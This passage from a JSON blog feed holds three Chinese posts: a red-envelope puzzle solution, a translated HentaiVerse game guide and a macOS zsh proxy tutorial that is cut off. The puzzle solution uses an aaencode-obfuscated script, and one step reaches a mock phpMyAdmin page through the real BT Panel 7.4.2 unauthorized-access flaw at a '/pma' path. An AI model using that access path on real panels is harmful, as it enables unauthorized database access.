4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板...）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div>[译] HentaiVerse 建议和指导</div>\n<div><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-24</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/1.png\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/2.png\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 